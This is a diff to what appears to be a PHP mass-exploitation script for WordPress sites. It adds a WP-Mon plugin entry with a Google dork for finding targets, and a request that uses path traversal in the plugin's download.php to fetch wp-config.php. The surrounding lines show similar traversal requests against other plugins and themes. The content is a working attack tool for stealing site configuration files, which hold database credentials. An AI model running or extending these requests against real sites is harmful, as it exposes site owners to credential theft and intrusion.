@@ -146,6 +146,11 @@
 # Vendor Homepage:: https://wordpress.org/plugins/wp-mobile-edition/
 # Google Dork: inurl:?fdx_switcher=mobile
 # ------------------------------------------------------------------------------
+#
+# WordPress WP-Mon Arbitrary File Download Vulnerability
+# Vendor Homepage:: https://wordpress.org/plugins/wp-mon/
+# Google Dork: inurl:"/wp-content/plugins/wp-mon"
+# ------------------------------------------------------------------------------
 # http://i.imgur.com/45BFlNe.png
 # ===============================================================================
 
@@ -247,6 +252,7 @@ __request($argv[1], '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_pos
 
 __request($argv[1], '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php');
 
+__request($argv[1], '/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php');
 
 function __request($url, $plugin) {
 
